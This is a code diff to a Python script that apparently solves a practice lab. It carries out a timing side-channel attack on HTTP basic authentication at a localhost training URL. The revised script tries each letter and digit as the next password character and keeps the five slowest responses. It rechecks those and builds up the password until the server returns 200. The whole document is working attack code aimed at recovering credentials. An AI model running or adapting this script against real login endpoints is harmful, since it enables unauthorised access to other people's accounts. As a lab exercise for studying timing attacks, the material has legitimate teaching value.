@@ -7,23 +7,58 @@ import time
 import sys
 import string
 
-password = sys.argv[1]
-r = requests.get("http://localhost:8001/authentication/example2/")
-
+password = ""
+url = sys.argv[1]
+# "http://localhost:8001/authentication/example2/"
 
 """Example assumes letters and numbers."""
-while r.status_code != 200:
-	nextletter = ''
-	lowestelapsed = 1000.
-	for letter in string.ascii_lowercase + string.digits + string.ascii_uppercase:
+checkspace = string.ascii_lowercase + string.digits + string.ascii_uppercase
+# testing checkspace = ['p'] #,'4','s','w','0','r','d']
+
+def confirm():
+	"""Confirm command line arguments and URL."""
+	if len(sys.argv) != 2:
+		print("Usage: auth2.py <website>")
+		print("Example: auth2.py http://localhost:8001/authentication/example2/")
+		sys.exit(0)
+	r = requests.get(url)
+	if r.status_code != 401:
+		print("Error: check URL.")
+		sys.exit(0)
+
+def checklets(letters, url, size):
+	"""Checks letters: given a list of characters, will perform
+	timing attack. Will keep buffer of [size] characters which
+	took longest, and will recheck them for the single longest."""
+
+	highestelapsed = [0.] * size
+	highletters = [' '] * size
+
+	for letter in letters:
 		start = time.time()
-		r = requests.get("http://localhost:8001/authentication/example2/",
-			auth=("hacker", password))
+		r = requests.get(url,
+			auth=("hacker", password + letter))
 		elapsed = time.time() - start
 		print("Pass " + password + letter + " in " + str(elapsed))
-		if elapsed < lowestelapsed:
-			lowestelapsed = elapsed
-			nextletter = letter
+		if elapsed > min(highestelapsed):
+			index = highestelapsed.index(min(highestelapsed))
+			del highestelapsed[index]
+			del highletters[index]
+			highestelapsed.append(elapsed)
+			highletters.append(letter)
+	if len(highletters) == 1:
+		return highletters[0]
+	else:
+		return checklets(highletters, url, 1)
+
+
+r = requests.get(url)
+confirm()
+while r.status_code != 200:
+	nextletter = checklets(checkspace, url, 5)
 	password = password + nextletter
 	print("Current password: " + password)
-print("Password: " + password + letter)
+
+	r = requests.get(url, auth=("hacker",password))
+
+print("Password: " + password)
